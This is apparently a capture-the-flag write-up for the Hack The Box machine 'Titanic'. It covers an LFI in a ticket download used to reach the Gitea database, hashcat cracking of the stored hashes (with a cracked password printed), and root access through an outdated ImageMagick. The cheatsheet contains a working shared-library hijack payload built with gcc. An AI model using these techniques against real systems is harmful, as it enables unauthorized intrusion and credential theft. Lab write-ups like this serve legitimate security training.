# Titanic \[Easy]

## Report

HTTP website posts a form and downloads a 'ticket' from local, vulnerable to LFI, find an exposed gitea directory with access to source mentioning path to find creds. Leverage this to find creds for user 'developer'

Looking around, see a script which uses binary 'ImageMagick' as sudo which uses an outdated version that is vulnerable to Arbritary Code Execution

{% embed url="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" %}

## Cheatsheet

```
#Final path for LFI, after reading documentation
/home/developer/gitea/data/gitea/gitea.db

hashcat64.exe -m 10900 hash.txt rockyou.txt -d 1

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
attribute((constructor)) void init(){
system("sudo cat /root/root.txt");
exit(0);
}
EOF

magick /dev/null dev/null
```

## Proof

endpoint `/book` post form data\
`/download` variable ticket modify this yea

v2 was forbidden                                   (Was there any point?)

`/home/developer/gitea/data:/data`  (From gitea dockerfile)

`data/gitea.db`                                       (From Google, db file path)

volumes:\
`- ./gitea:/data`                                         (From gitea documentation, SQL Database setup)

Our dockerfile mentions one path and the sql dockerfile appends to it further

Hence final path: `/home/developer/gitea/data/gitea/gitea.db`



Convert gitea PBKDF2-HMAC-SHA256 password hashes to hashcat readable form

`developer:25282528`

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (82).png" alt="" width="563"><figcaption></figcaption></figure></div>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## In-Game Pitch Notes

Once you clock an LFI, you have to be thinking about exposing creds come on

Privesc Methodology

linpease\
sudo -l\
suid\
crontab\
no sus binaries with useless perms\
no path exploit

opt was written in red lmao (readable by user but not world readable)

The convert command is deprecated in IMv7, use "magick" instead of "convert" or "magick convert"
